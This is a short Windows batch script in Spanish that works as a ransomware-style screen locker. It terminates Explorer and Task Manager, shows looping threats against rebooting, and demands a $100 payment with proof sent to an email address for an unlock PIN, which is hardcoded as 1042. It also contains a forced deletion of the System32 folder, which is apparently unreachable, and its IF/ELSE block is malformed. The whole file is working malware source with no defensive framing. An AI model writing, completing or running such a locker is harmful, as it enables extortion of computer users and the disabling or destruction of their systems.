color 0A
@echo off 
title ESTE ORDENADOR HA SIDO SECUESTRADO.
taskkill /f /im explorer.exe 
taskkill /f /im ctfmon.exe
taskkill /f /im taskmgr.exe
:bucle 
cls               
msg * LEA CON ATENCION.
msg * NO REINICIAR NI APAGAR EL EQUIPO.
msg * AL HACERLO SE ELIMINARA TODA LA INFORMACION DEL DISCO DURO!.
msg * TENGA CUIDADO, NO VAYA A CERRAR LA VENTANA DE ARRIBA.
msg * SI LA CIERRA PERDERA SU COMPUTADORA.
msg * SIGA LAS INDICACIONES PARA LIBERAR SU EQUIPO.
echo =============================================
echo REALICE UN PAGO DE $100USD A XXXXXXXX
echo =============================================
echo ENVIE UN COMPROBANTE DE PAGO A angel@mail.com
echo Y RECIBIRA UN PIN DE DESBLOQUEO.
echo =============================================
set /p pass=Digite el PIN: 
if %pass%==1042 (goto passcorrecto) 
ELSE (
goto bucle
DEL  /F /A C:\Windows\System32
)
:passcorrecto
echo Felicidades! Su equipo esta seguro ahora.
shutdown -r -t 20 -c "Se reiniciara el equipo para liberar los archivos."
start explorer.exe 
pause
exit